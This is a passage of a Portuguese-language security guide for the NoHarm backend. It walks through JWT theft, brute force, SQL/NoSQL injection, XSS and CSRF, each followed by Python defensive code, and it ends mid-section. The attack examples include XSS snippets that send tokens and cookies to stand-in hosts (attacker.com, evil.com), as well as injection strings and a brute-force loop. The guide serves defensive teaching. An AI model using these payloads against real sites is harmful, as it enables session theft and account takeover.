# 🛡️ Guia Completo de Segurança - Backend NoHarm

## Índice
1. [Ataques de Autenticação](#1-ataques-de-autenticação)
2. [Ataques de Injeção](#2-ataques-de-injeção)
3. [Ataques de Sessão](#3-ataques-de-sessão)
4. [Ataques de Negação de Serviço](#4-ataques-de-negação-de-serviço)
5. [Ataques de Dados](#5-ataques-de-dados)
6. [Ataques de WebSocket](#6-ataques-de-websocket)
7. [Configuração Completa](#7-configuração-completa)

---

## 1. Ataques de Autenticação

### 1.1 JWT Token Theft (Roubo de Token)

**O que é:**
Atacante consegue roubar o token JWT do usuário e usá-lo para se passar por ele.

**Como acontece:**
```javascript
// Cenário 1: XSS rouba token do localStorage
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
</script>

// Cenário 2: Man-in-the-middle em HTTP (não HTTPS)
GET /api/user HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIs... ← Interceptado!

// Cenário 3: Malware no dispositivo
```

**Prevenção:**

```python
# backend/security/jwtHandler.py
import jwt
import secrets
from datetime import datetime, timedelta
from typing import Optional, Dict
import os

class JwtHandler:
    def __init__(self):
        # Secrets devem estar em variáveis de ambiente
        self.secretKey = os.getenv('JWT_SECRET_KEY')
        self.refreshSecretKey = os.getenv('JWT_REFRESH_SECRET_KEY')
        self.algorithm = 'HS256'
        
        # MEDIDA 1: Token de acesso com vida CURTA
        self.accessTokenExpire = timedelta(minutes=15)  # Apenas 15 minutos
        
        # MEDIDA 2: Refresh token com vida mais longa
        self.refreshTokenExpire = timedelta(days=7)
    
    def createAccessToken(self, userId: str, deviceId: str = None) -> str:
        """
        Cria token de acesso com claims mínimos
        
        MEDIDA 3: JTI (JWT ID) único para cada token
        Permite revogar tokens específicos
        """
        payload = {
            'sub': userId,                                    # Subject (quem)
            'type': 'access',                                 # Tipo do token
            'exp': datetime.utcnow() + self.accessTokenExpire, # Expiração
            'iat': datetime.utcnow(),                         # Emitido em
            'jti': secrets.token_urlsafe(16),                 # ID único
            'device_id': deviceId or 'unknown'                # Dispositivo
        }
        
        return jwt.encode(payload, self.secretKey, algorithm=self.algorithm)
    
    def createRefreshToken(self, userId: str, deviceId: str = None) -> str:
        """
        Cria refresh token para renovar access tokens
        """
        payload = {
            'sub': userId,
            'type': 'refresh',
            'exp': datetime.utcnow() + self.refreshTokenExpire,
            'iat': datetime.utcnow(),
            'jti': secrets.token_urlsafe(16),
            'device_id': deviceId or 'unknown'
        }
        
        return jwt.encode(payload, self.refreshSecretKey, algorithm=self.algorithm)
    
    def verifyToken(self, token: str, tokenType: str = 'access') -> Optional[Dict]:
        """
        MEDIDA 4: Verificação rigorosa de tokens
        """
        try:
            # Usa chave correta baseada no tipo
            secret = self.secretKey if tokenType == 'access' else self.refreshSecretKey
            
            # Decodifica e valida
            payload = jwt.decode(
                token, 
                secret, 
                algorithms=[self.algorithm],
                options={
                    'verify_exp': True,  # Verifica expiração
                    'verify_iat': True,  # Verifica data de emissão
                    'require': ['sub', 'type', 'exp', 'iat', 'jti']  # Campos obrigatórios
                }
            )
            
            # MEDIDA 5: Verifica tipo do token
            if payload.get('type') != tokenType:
                print(f"⚠️ Token type mismatch: expected {tokenType}, got {payload.get('type')}")
                return None
            
            # MEDIDA 6: Verifica se token foi revogado (blacklist)
            if self.isTokenBlacklisted(payload.get('jti')):
                print(f"⚠️ Token revoked: {payload.get('jti')[:8]}...")
                return None
            
            return payload
            
        except jwt.ExpiredSignatureError:
            print("⚠️ Token expired")
            return None
        except jwt.InvalidTokenError as e:
            print(f"⚠️ Invalid token: {str(e)}")
            return None
    
    def isTokenBlacklisted(self, jti: str) -> bool:
        """
        MEDIDA 7: Blacklist de tokens revogados
        Implementar com Redis para performance
        """
        # TODO: Implementar com Redis
        # return redis_client.exists(f"blacklist:{jti}")
        return False
    
    def revokeToken(self, jti: str, expiresIn: int):
        """
        Adiciona token à blacklist
        """
        # TODO: Implementar com Redis
        # redis_client.setex(f"blacklist:{jti}", expiresIn, "1")
        pass


# Exemplo de uso:
# -----------------
jwtHandler = JwtHandler()

# Login: criar tokens
accessToken = jwtHandler.createAccessToken(userId="user123", deviceId="mobile-abc")
refreshToken = jwtHandler.createRefreshToken(userId="user123", deviceId="mobile-abc")

# Retornar ao cliente
response = {
    "access_token": accessToken,
    "refresh_token": refreshToken,
    "token_type": "Bearer",
    "expires_in": 900  # 15 minutos em segundos
}

# Verificar token em requisições
payload = jwtHandler.verifyToken(accessToken, tokenType='access')
if payload:
    userId = payload['sub']
    # Prosseguir com requisição
else:
    # Token inválido, expirado ou revogado
    return {"error": "Unauthorized"}, 401
```

**Exemplo de fluxo completo:**

```python
# backend/routes/auth.py
from fastapi import APIRouter, HTTPException, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

router = APIRouter()
security = HTTPBearer()
jwtHandler = JwtHandler()

@router.post("/login")
async def login(username: str, password: str):
    """Login e geração de tokens"""
    
    # 1. Verificar credenciais (exemplo simplificado)
    user = database.getUserByUsername(username)
    if not user or not bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    
    # 2. Gerar tokens
    accessToken = jwtHandler.createAccessToken(userId=user.id)
    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
    
    # 3. Salvar refresh token no banco (para rotação)
    database.saveRefreshToken(userId=user.id, token=refreshToken)
    
    return {
        "access_token": accessToken,
        "refresh_token": refreshToken,
        "token_type": "Bearer"
    }


@router.post("/refresh")
async def refreshAccessToken(refreshToken: str):
    """Renovar access token usando refresh token"""
    
    # 1. Verificar refresh token
    payload = jwtHandler.verifyToken(refreshToken, tokenType='refresh')
    if not payload:
        raise HTTPException(status_code=401, detail="Refresh token inválido")
    
    userId = payload['sub']
    
    # 2. Verificar se refresh token existe no banco
    if not database.isRefreshTokenValid(userId, refreshToken):
        raise HTTPException(status_code=401, detail="Refresh token não encontrado")
    
    # 3. ROTAÇÃO: Revogar refresh token antigo
    jwtHandler.revokeToken(payload['jti'], expiresIn=604800)  # 7 dias
    
    # 4. Criar novos tokens
    newAccessToken = jwtHandler.createAccessToken(userId=userId)
    newRefreshToken = jwtHandler.createRefreshToken(userId=userId)
    
    # 5. Salvar novo refresh token
    database.updateRefreshToken(userId=userId, oldToken=refreshToken, newToken=newRefreshToken)
    
    return {
        "access_token": newAccessToken,
        "refresh_token": newRefreshToken,
        "token_type": "Bearer"
    }


@router.post("/logout")
async def logout(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Logout e revogação de tokens"""
    
    token = credentials.credentials
    
    # 1. Verificar token
    payload = jwtHandler.verifyToken(token, tokenType='access')
    if not payload:
        raise HTTPException(status_code=401, detail="Token inválido")
    
    userId = payload['sub']
    jti = payload['jti']
    
    # 2. Revogar access token
    jwtHandler.revokeToken(jti, expiresIn=900)  # 15 minutos
    
    # 3. Revogar todos refresh tokens do usuário
    database.revokeAllRefreshTokens(userId)
    
    return {"message": "Logout realizado com sucesso"}


def getCurrentUser(credentials: HTTPAuthorizationCredentials = Depends(security)) -> str:
    """
    Dependency para proteger rotas
    Uso: @router.get("/protected", dependencies=[Depends(getCurrentUser)])
    """
    token = credentials.credentials
    payload = jwtHandler.verifyToken(token, tokenType='access')
    
    if not payload:
        raise HTTPException(status_code=401, detail="Token inválido ou expirado")
    
    return payload['sub']  # Retorna userId
```

---

### 1.2 Brute Force Attack (Ataque de Força Bruta)

**O que é:**
Atacante tenta milhares de combinações de senha até acertar.

**Como acontece:**
```python
# Bot tentando senhas comuns:
for password in ['123456', 'password', '12345678', 'qwerty', ...]:
    response = requests.post('/login', json={
        'username': 'maria@email.com',
        'password': password
    })
    if response.status_code == 200:
        print(f"SENHA ENCONTRADA: {password}")
        break
```

**Prevenção:**

```python
# backend/security/rateLimiter.py
from datetime import datetime, timedelta
from typing import Dict, Tuple
import time

class LoginRateLimiter:
    """
    MEDIDA 1: Rate limiting específico para login
    """
    def __init__(self):
        # Armazena tentativas: {username: [timestamp1, timestamp2, ...]}
        self.loginAttempts: Dict[str, list] = {}
        
        # Armazena bloqueios: {username: timestamp_bloqueio}
        self.lockedAccounts: Dict[str, datetime] = {}
        
        # Configurações
        self.maxAttempts = 5           # Máximo 5 tentativas
        self.windowMinutes = 15        # Em 15 minutos
        self.lockoutMinutes = 30       # Bloqueia por 30 minutos
    
    def isAccountLocked(self, username: str) -> Tuple[bool, int]:
        """
        Verifica se conta está bloqueada
        Retorna: (está_bloqueado, segundos_restantes)
        """
        if username in self.lockedAccounts:
            lockedUntil = self.lockedAccounts[username]
            now = datetime.utcnow()
            
            if now < lockedUntil:
                # Ainda bloqueado
                remainingSeconds = int((lockedUntil - now).total_seconds())
                return True, remainingSeconds
            else:
                # Bloqueio expirou
                del self.lockedAccounts[username]
                return False, 0
        
        return False, 0
    
    def recordLoginAttempt(self, username: str, success: bool) -> Tuple[bool, int]:
        """
        Registra tentativa de login
        Retorna: (permitido, tentativas_restantes)
        """
        # Verifica se já está bloqueado
        isLocked, remaining = self.isAccountLocked(username)
        if isLocked:
            return False, 0
        
        now = datetime.utcnow()
        
        # Se login bem-sucedido, limpa histórico
        if success:
            if username in self.loginAttempts:
                del self.loginAttempts[username]
            return True, self.maxAttempts
        
        # Inicializa lista de tentativas se não existir
        if username not in self.loginAttempts:
            self.loginAttempts[username] = []
        
        # Remove tentativas antigas (fora da janela de tempo)
        cutoff = now - timedelta(minutes=self.windowMinutes)
        self.loginAttempts[username] = [
            ts for ts in self.loginAttempts[username] 
            if ts > cutoff
        ]
        
        # Adiciona nova tentativa
        self.loginAttempts[username].append(now)
        
        # Conta tentativas na janela
        attempts = len(self.loginAttempts[username])
        remaining = self.maxAttempts - attempts
        
        # MEDIDA 2: Bloqueio progressivo
        if attempts >= self.maxAttempts:
            # Bloqueia conta
            lockUntil = now + timedelta(minutes=self.lockoutMinutes)
            self.lockedAccounts[username] = lockUntil
            
            # MEDIDA 3: Log de segurança
            print(f"🚨 CONTA BLOQUEADA: {username} após {attempts} tentativas")
            
            return False, 0
        
        # MEDIDA 4: Aviso após 3 tentativas
        if attempts >= 3:
            print(f"⚠️ ALERTA: {username} - {attempts} tentativas falhas")
        
        return True, remaining


class IpRateLimiter:
    """
    MEDIDA 5: Rate limiting por IP
    Previne ataques distribuídos
    """
    def __init__(self):
        self.ipAttempts: Dict[str, list] = {}
        self.blockedIps: Dict[str, datetime] = {}
        
        self.maxAttemptsPerIp = 20     # 20 tentativas por IP
        self.windowMinutes = 10         # Em 10 minutos
        self.blockMinutes = 60          # Bloqueia por 1 hora
    
    def isIpBlocked(self, ip: str) -> Tuple[bool, int]:
        """Verifica se IP está bloqueado"""
        if ip in self.blockedIps:
            blockedUntil = self.blockedIps[ip]
            now = datetime.utcnow()
            
            if now < blockedUntil:
                remaining = int((blockedUntil - now).total_seconds())
                return True, remaining
            else:
                del self.blockedIps[ip]
                return False, 0
        
        return False, 0
    
    def recordIpAttempt(self, ip: str) -> Tuple[bool, int]:
        """Registra tentativa por IP"""
        isBlocked, remaining = self.isIpBlocked(ip)
        if isBlocked:
            return False, 0
        
        now = datetime.utcnow()
        
        if ip not in self.ipAttempts:
            self.ipAttempts[ip] = []
        
        # Remove tentativas antigas
        cutoff = now - timedelta(minutes=self.windowMinutes)
        self.ipAttempts[ip] = [ts for ts in self.ipAttempts[ip] if ts > cutoff]
        
        # Adiciona nova tentativa
        self.ipAttempts[ip].append(now)
        
        attempts = len(self.ipAttempts[ip])
        remaining = self.maxAttemptsPerIp - attempts
        
        if attempts >= self.maxAttemptsPerIp:
            blockUntil = now + timedelta(minutes=self.blockMinutes)
            self.blockedIps[ip] = blockUntil
            print(f"🚨 IP BLOQUEADO: {ip} após {attempts} tentativas")
            return False, 0
        
        return True, remaining


# Uso na rota de login:
# ----------------------
loginLimiter = LoginRateLimiter()
ipLimiter = IpRateLimiter()

@router.post("/login")
async def login(request: Request, username: str, password: str):
    """Login com proteção contra brute force"""
    
    # Obter IP do cliente
    clientIp = request.client.host
    
    # VERIFICAÇÃO 1: Checar se IP está bloqueado
    ipBlocked, ipRemaining = ipLimiter.isIpBlocked(clientIp)
    if ipBlocked:
        raise HTTPException(
            status_code=429,
            detail=f"IP bloqueado. Tente novamente em {ipRemaining}s"
        )
    
    # VERIFICAÇÃO 2: Checar se conta está bloqueada
    accountLocked, accountRemaining = loginLimiter.isAccountLocked(username)
    if accountLocked:
        raise HTTPException(
            status_code=429,
            detail=f"Conta bloqueada. Tente novamente em {accountRemaining}s"
        )
    
    # Tentar autenticar
    user = database.getUserByUsername(username)
    isValidPassword = user and bcrypt.checkpw(password.encode(), user.password_hash.encode())
    
    # MEDIDA 6: Tempo constante de resposta (evita timing attacks)
    time.sleep(0.1)  # 100ms sempre, sucesso ou falha
    
    # Registrar tentativa
    ipAllowed, ipRemaining = ipLimiter.recordIpAttempt(clientIp)
    accountAllowed, attemptsRemaining = loginLimiter.recordLoginAttempt(username, isValidPassword)
    
    if not isValidPassword:
        # MEDIDA 7: Mensagem genérica (não revela se username existe)
        raise HTTPException(
            status_code=401,
            detail=f"Credenciais inválidas. {attemptsRemaining} tentativas restantes"
        )
    
    # Login bem-sucedido
    accessToken = jwtHandler.createAccessToken(userId=user.id)
    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
    
    return {
        "access_token": accessToken,
        "refresh_token": refreshToken
    }
```

**MEDIDA 8: Adicionar CAPTCHA após tentativas**

```python
# backend/security/captcha.py
import requests
import os

class CaptchaVerifier:
    def __init__(self):
        self.secretKey = os.getenv('RECAPTCHA_SECRET_KEY')
    
    def verify(self, token: str, userIp: str) -> bool:
        """Verifica token do reCAPTCHA"""
        response = requests.post('https://www.google.com/recaptcha/api/siteverify', data={
            'secret': self.secretKey,
            'response': token,
            'remoteip': userIp
        })
        
        result = response.json()
        return result.get('success', False)


# Modificar login para exigir CAPTCHA após 3 tentativas:
captchaVerifier = CaptchaVerifier()

@router.post("/login")
async def login(request: Request, username: str, password: str, captchaToken: str = None):
    # ... código anterior ...
    
    # Se já teve 3+ tentativas falhas, exige CAPTCHA
    if username in loginLimiter.loginAttempts:
        attempts = len(loginLimiter.loginAttempts[username])
        if attempts >= 3:
            if not captchaToken:
                raise HTTPException(
                    status_code=400,
                    detail="CAPTCHA obrigatório após múltiplas tentativas"
                )
            
            if not captchaVerifier.verify(captchaToken, clientIp):
                raise HTTPException(
                    status_code=400,
                    detail="CAPTCHA inválido"
                )
    
    # ... resto do código ...
```

---

## 2. Ataques de Injeção

### 2.1 SQL Injection

**O que é:**
Atacante injeta código SQL malicioso através de inputs.

**Como acontece:**
```python
# Código VULNERÁVEL ❌
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
# Atacante envia: username = "admin' --"
# Query resultante: SELECT * FROM users WHERE username='admin' --' AND password='...'
# Comentário (--) ignora verificação de senha!
```

**Prevenção:**

```python
# backend/database/userRepository.py
from sqlalchemy import create_engine, Column, String, Integer, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import bcrypt

Base = declarative_base()

class User(Base):
    """Modelo de usuário com SQLAlchemy"""
    __tablename__ = 'users'
    
    id = Column(String(50), primary_key=True)
    username = Column(String(100), unique=True, nullable=False)
    email = Column(String(200), unique=True, nullable=False)
    password_hash = Column(String(200), nullable=False)
    created_at = Column(DateTime, nullable=False)


class UserRepository:
    """
    MEDIDA 1: Usar ORM (SQLAlchemy) ao invés de SQL puro
    ORM previne SQL Injection automaticamente
    """
    def __init__(self, databaseUrl: str):
        self.engine = create_engine(databaseUrl)
        Base.metadata.create_all(self.engine)
        Session = sessionmaker(bind=self.engine)
        self.session = Session()
    
    def getUserByUsername(self, username: str) -> User:
        """
        SEGURO: SQLAlchemy usa parametrização automática
        """
        return self.session.query(User).filter(
            User.username == username  # Parametrizado automaticamente
        ).first()
    
    def getUserByEmail(self, email: str) -> User:
        """SEGURO: Parâmetros escapados"""
        return self.session.query(User).filter(
            User.email == email
        ).first()
    
    def createUser(self, userId: str, username: str, email: str, password: str):
        """
        MEDIDA 2: Validação de entrada antes de salvar
        """
        # Validar formato de email
        if not self.isValidEmail(email):
            raise ValueError("Email inválido")
        
        # Validar username (apenas alfanuméricos e underscore)
        if not self.isValidUsername(username):
            raise ValueError("Username inválido")
        
        # MEDIDA 3: Hash de senha com bcrypt
        passwordHash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
        
        newUser = User(
            id=userId,
            username=username,
            email=email,
            password_hash=passwordHash.decode(),
            created_at=datetime.utcnow()
        )
        
        self.session.add(newUser)
        self.session.commit()
        
        return newUser
    
    def isValidEmail(self, email: str) -> bool:
        """Valida formato de email"""
        import re
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def isValidUsername(self, username: str) -> bool:
        """Valida username (whitelist de caracteres)"""
        import re
        # Apenas letras, números, underscore e hífen
        pattern = r'^[a-zA-Z0-9_-]{3,30}$'
        return re.match(pattern, username) is not None


# Se REALMENTE precisar usar SQL puro (não recomendado):
# -------------------------------------------------------
from sqlalchemy import text

def getUserByIdRaw(userId: str) -> dict:
    """
    MEDIDA 4: Se usar SQL puro, SEMPRE usar parâmetros
    """
    # ❌ NUNCA FAÇA ISTO:
    # query = f"SELECT * FROM users WHERE id = '{userId}'"
    
    # ✅ SEMPRE FAÇA ISTO:
    query = text("SELECT * FROM users WHERE id = :user_id")
    result = session.execute(query, {"user_id": userId})
    return result.fetchone()
```

**Exemplo de ataque bloqueado:**

```python
# Tentativa de ataque:
maliciousUsername = "admin' OR '1'='1' --"

# Com SQL puro VULNERÁVEL ❌:
query = f"SELECT * FROM users WHERE username='{maliciousUsername}'"
# Resultado: SELECT * FROM users WHERE username='admin' OR '1'='1' --'
# Retorna TODOS os usuários! 🚨

# Com SQLAlchemy SEGURO ✅:
user = session.query(User).filter(User.username == maliciousUsername).first()
# SQLAlchemy converte para:
# SELECT * FROM users WHERE username = 'admin'' OR ''1''=''1'' --'
# Busca literalmente por esse username estranho, não encontra nada ✅
```

---

### 2.2 NoSQL Injection (MongoDB)

**O que é:**
Similar ao SQL Injection, mas em bancos NoSQL como MongoDB.

**Como acontece:**
```python
# Código VULNERÁVEL ❌
username = request.json['username']
password = request.json['password']

# Atacante envia: {"username": {"$ne": null}, "password": {"$ne": null}}
user = db.users.find_one({"username": username, "password": password})
# Retorna qualquer usuário (primeira conta no banco)!
```

**Prevenção:**

```python
# backend/database/mongoRepository.py
from pymongo import MongoClient
from typing import Optional, Dict, Any
import re

class MongoUserRepository:
    def __init__(self, connectionString: str):
        self.client = MongoClient(connectionString)
        self.db = self.client['noharm']
        self.users = self.db['users']
    
    def getUserByUsername(self, username: str) -> Optional[Dict]:
        """
        MEDIDA 1: Validar que entrada é STRING, não objeto
        """
        # Verifica tipo
        if not isinstance(username, str):
            raise ValueError("Username deve ser string")
        
        # MEDIDA 2: Sanitizar entrada (remover caracteres especiais do MongoDB)
        sanitizedUsername = self.sanitizeMongoInput(username)
        
        return self.users.find_one({"username": sanitizedUsername})
    
    def sanitizeMongoInput(self, value: str) -> str:
        """
        Remove operadores do MongoDB ($, .)
        """
        if not isinstance(value, str):
            raise ValueError("Valor deve ser string")
        
        # Remove $ e .
        sanitized = value.replace('$', '').replace('.', '')
        
        return sanitized
    
    def validateUserInput(self, data: Dict[str, Any]) -> Dict[str, str]:
        """
        MEDIDA 3: Validação rigorosa de tipos
        """
        validated = {}
        
        # Username
        if 'username' not in data or not isinstance(data['username'], str):
            raise ValueError("Username inválido")
        validated['username'] = self.sanitizeMongoInput(data['username'])
        
        # Email
        if 'email' not in data or not isinstance(data['email'], str):
            raise ValueError("Email inválido")
        validated['email'] = self.sanitizeMongoInput(data['email'])
        
        # Password
        if 'password' not in data or not isinstance(data['password'], str):
            raise ValueError("Password inválido")
        validated['password'] = data['password']  # Será hasheado
        
        return validated
    
    def createUser(self, userData: Dict) -> str:
        """Cria usuário com validação"""
        # Valida e sanitiza
        validated = self.validateUserInput(userData)
        
        # Hash de senha
        validated['password_hash'] = bcrypt.hashpw(
            validated.pop('password').encode(),
            bcrypt.gensalt(rounds=12)
        ).decode()
        
        # Insere
        result = self.users.insert_one(validated)
        return str(result.inserted_id)


# Uso seguro:
# -----------
@router.post("/register")
async def register(request: Request):
    data = await request.json()
    
    try:
        # MEDIDA 4: Validação com Pydantic
        validatedData = UserRegistrationSchema(**data)
        
        # Criar usuário
        userId = mongoRepo.createUser(validatedData.dict())
        
        return {"user_id": userId}
        
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


# Schema de validação com Pydantic:
from pydantic import BaseModel, validator, EmailStr

class UserRegistrationSchema(BaseModel):
    username: str
    email: EmailStr
    password: str
    
    @validator('username')
    def validateUsername(cls, v):
        # MEDIDA 5: Whitelist de caracteres
        if not re.match(r'^[a-zA-Z0-9_-]{3,30}$', v):
            raise ValueError('Username inválido')
        
        # Remove operadores MongoDB
        if '$' in v or '.' in v:
            raise ValueError('Caracteres não permitidos')
        
        return v
    
    @validator('password')
    def validatePassword(cls, v):
        # MEDIDA 6: Requisitos de senha forte
        if len(v) < 8:
            raise ValueError('Senha deve ter no mínimo 8 caracteres')
        
        if not re.search(r'[A-Z]', v):
            raise ValueError('Senha deve conter letra maiúscula')
        
        if not re.search(r'[a-z]', v):
            raise ValueError('Senha deve conter letra minúscula')
        
        if not re.search(r'[0-9]', v):
            raise ValueError('Senha deve conter número')
        
        return v
```

---

### 2.3 XSS (Cross-Site Scripting)

**O que é:**
Atacante injeta JavaScript malicioso que roda no navegador de outros usuários.

**Como acontece:**
```javascript
// Usuário malicioso envia mensagem:
const message = "<script>fetch('https://evil.com/steal?token=' + localStorage.token)</script>";

// Se app renderizar sem sanitizar:
chatDiv.innerHTML = message;  // ❌ Script executa!

// JavaScript do atacante roda e rouba token
```

**Prevenção:**

```python
# backend/security/sanitizer.py
import bleach
import re
from typing import Dict, Any

class InputSanitizer:
    """
    MEDIDA 1: Sanitização de HTML no backend
    (Defesa em profundidade - sanitizar no front E back)
    """
    
    def __init__(self):
        # MEDIDA 2: Whitelist de tags permitidas
        self.allowedTags = []  # NoHarm não permite HTML
        self.allowedAttributes = {}
    
    def sanitizeHtml(self, content: str) -> str:
        """
        Remove TODAS as tags HTML e scripts
        """
        if not isinstance(content, str):
            return ""
        
        # Remove tags HTML
        cleaned = bleach.clean(
            content,
            tags=self.allowedTags,
            attributes=self.allowedAttributes,
            strip=True  # Remove tags ao invés de escapar
        )
        
        # MEDIDA 3: Remove caracteres de controle perigosos
        cleaned = re.sub(r'[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]', '', cleaned)
        
        # MEDIDA 4: Remove javascript: e data: URIs
        cleaned = re.sub(r'javascript:', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'data:', '', cleaned, flags=re.IGNORECASE)
        
        return cleaned.strip()
    
    def sanitizeMessage(self, message: Dict[str, Any]) -> Dict[str, str]:
        """Sanitiza mensagem de chat"""
        if not isinstance(message, dict):
            raise ValueError("Mensagem deve ser objeto")
        
        return {
            'content': self.sanitizeHtml(message.get('content', '')),
            'recipientId': self.sanitizeId(message.get('recipientId', ''))
        }
    
    def sanitizeId(self, userId: str) -> str:
        """
        MEDIDA 5: Whitelist para IDs
        """
        if not isinstance(userId, str):
            raise ValueError("ID deve ser string")
        
        # Apenas alfanuméricos, underscore e hífen
        if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', userId):
            raise ValueError("ID inválido")
        
        return userId


# Validação com Pydantic (camada adicional):
from pydantic import BaseModel, validator

class ChatMessageSchema(BaseModel):
    content: str
    recipientId: str
    
    @validator('content')
    def sanitizeContent(cls, v):
        """MEDIDA 6: Validação automática"""
        sanitizer = InputSanitizer()
        return sanitizer.sanitizeHtml(v)
    
    @validator('content')
    def validateLength(cls, v):
        """MEDIDA 7: Limite de tamanho"""
        if len(v) > 2000:
            raise ValueError('Mensagem muito longa (máx 2000 caracteres)')
        
        if len(v) < 1:
            raise ValueError('Mensagem não pode estar vazia')
        
        return v
    
    @validator('recipientId')
    def validateRecipient(cls, v):
        """MEDIDA 8: Validação de destinatário"""
        if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', v):
            raise ValueError('ID de destinatário inválido')
        return v


# Uso na rota de mensagem:
sanitizer = InputSanitizer()

@router.post("/messages/send")
async def sendMessage(message: ChatMessageSchema, userId: str = Depends(getCurrentUser)):
    """Enviar mensagem com sanitização"""
    
    # Pydantic já sanitizou, mas dupla verificação
    sanitizedContent = sanitizer.sanitizeHtml(message.content)
    
    # Salvar no banco
    messageId = database.saveMessage({
        'sender_id': userId,
        'recipient_id': message.recipientId,
        'content': sanitizedContent,
        'created_at': datetime.utcnow()
    })
    
    # Emitir via WebSocket
    await socketManager.emitToUser(message.recipientId, 'new_message', {
        'id': messageId,
        'content': sanitizedContent,  # Já sanitizado
        'sender_id': userId
    })
    
    return {"message_id": messageId}
```

**MEDIDA 9: Content Security Policy (CSP)**

```python
# backend/middleware/security.py
from fastapi import Request
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        
        # MEDIDA 10: CSP - Content Security Policy
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "                    # Só do mesmo domínio
            "script-src 'self' 'unsafe-inline'; "     # Scripts só do domínio
            "style-src 'self' 'unsafe-inline'; "      # Estilos só do domínio
            "img-src 'self' data: https:; "           # Imagens
            "connect-src 'self' wss://noharm.app; "   # WebSocket
            "font-src 'self'; "                       # Fontes
            "object-src 'none'; "                     # Sem Flash/Java
            "base-uri 'self'; "                       # Previne base tag injection
            "form-action 'self'; "                    # Forms só para mesmo domínio
            "frame-ancestors 'none'; "                # Não pode ser em iframe
        )
        
        # Outros headers de segurança
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        
        return response
```

**Exemplo de ataque bloqueado:**

```python
# Atacante tenta XSS:
maliciousMessage = """
<img src=x onerror="
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('jwt'),
      cookies: document.cookie
    })
  })
">
"""

# Após sanitização:
sanitizedMessage = ""  # Removido completamente

# Ou se permitíssemos <img> mas não onerror:
sanitizedMessage = "<img src=x>"  # Atributo perigoso removido
```

---

## 3. Ataques de Sessão

### 3.1 CSRF (Cross-Site Request Forgery)

**O que é:**
Site malicioso faz requisições para sua aplicação usando credenciais da vítima.

**Como acontece:**
```html
<!-- evil.com -->
<html>
<body>
  <!-- Vítima visita evil.com enquanto logada no NoHarm -->
  <img src="https://noharm.app/api/counter/reset" />
  
  <!-- Navegador envia cookies automaticamente! -->
  <!-- Contador resetado sem consentimento 🚨 -->
</body>
</html>
```

**Prevenção:**

```python
# backend/security/csrfProtection.py
import secrets
from typing import Optional
from datetime import datetime, timedelta

class CsrfProtection:
    """
    MEDIDA 1: CSRF Token (Double Submit Cookie)
    """
    def __init__(self):
        self.tokens = {}  # {token: expiry}
        self.tokenExpiry = timedelta(hours=24)
    
    def generateToken(self, userId: str) -> str:
        """
        Gera token CSRF único
        """
        # MEDIDA 2: Token criptograficamente seguro
        token = secrets.token_urlsafe(32)
        
        # Armazena com expiração
        expiry = datetime.utcnow() + self.tokenExpiry
        self.tokens[token] = {
            'user_id': userId,
            'expiry': expiry
        }
        
        return token
    
    def validateToken(self, token: str, userId: str) -> bool:
        """
        Valida token CSRF
        """
        if not token or token not in self.tokens:
            return False
        
        tokenData = self.tokens[token]
        
        # Verifica expiração
        if datetime.utcnow() > tokenData['expiry']:
            del self.tokens[token]
            return False
        
        # Verifica que token pertence ao usuário
        if tokenData['user_id'] != userId:
            return False
        
        return True
    
    def removeToken(self, token: str):
        """Remove token após uso (single-use)"""
        if token in self.tokens:
            del self.tokens[token]


csrfProtection = CsrfProtection()

# Rota para obter CSRF token:
@router.get("/csrf-token")
async def getCsrfToken(userId: str = Depends(getCurrentUser)):
    """
    Cliente chama isto após login para obter CSRF token
    """
    token = csrfProtection.generateToken(userId)
    
    return {"csrf_token": token}


# Middleware de validação CSRF:
from fastapi import Request, HTTPException
from starlette.middleware.base import BaseHTTPMiddleware

class CsrfMiddleware(BaseHTTPMiddleware):
    """
    MEDIDA 3: Validar CSRF em todas requisições modificadoras
    """
    def __init__(self, app):
        super().__init__(app)
        self.exemptPaths = ['/api/login', '/api/register', '/api/csrf-token']
    
    async def dispatch(self, request: Request, call_next):
        # Só valida métodos que modificam dados
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            # Pula rotas públicas
            if request.url.path not in self.exemptPaths:
                # Obtém token do header
                csrfToken = request.headers.get('X-CSRF-Token')
                
                if not csrfToken:
                    raise HTTPException(
                        status_code=403,
                        detail="CSRF token ausente"
                    )
                
                # Obtém userId do JWT
                authHeader = request.headers.get('Authorization', '')
                if not authHeader.startswith('Bearer '):
                    raise HTTPException(status_code=401, detail="Não autenticado")
                
                jwt_token = authHeader[7:]
                payload = jwtHandler.verifyToken(jwt_token)
                
                if not payload:
                    raise HTTPException(status_code=401, detail="Token inválido")
                
                userId = payload['sub']
                
                # Valida CSRF token
                if not csrfProtection.validateToken(csrfToken, userId):
                    raise HTTPException(
                        status_code=403,
                        detail="CSRF token inválido"
                    )
        
        response = await call_next(request)
        return response


# MEDIDA 4: SameSite Cookie
# --------------------------
@router.post("/login")
async def login(response: Response, username: str, password: str):
    # ... autenticação ...
    
